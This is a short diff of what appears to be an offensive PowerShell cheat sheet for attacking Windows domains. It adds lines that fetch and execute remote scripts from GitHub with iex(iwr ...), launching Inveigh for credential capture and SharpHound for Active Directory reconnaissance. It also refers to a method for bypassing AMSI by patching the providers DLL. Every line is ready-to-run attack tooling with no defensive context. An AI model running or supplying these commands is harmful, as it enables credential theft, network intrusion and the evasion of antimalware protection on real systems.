@@ -33,9 +33,11 @@ Get-NetLocalGroupMember
 
 # admin privs required
 iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
+Invoke-Inveigh
 
 # user context ok
 iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing)
+Invoke-SharpHound
 
 # user context ok
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (Copy First Method: Patch the providers DLL)
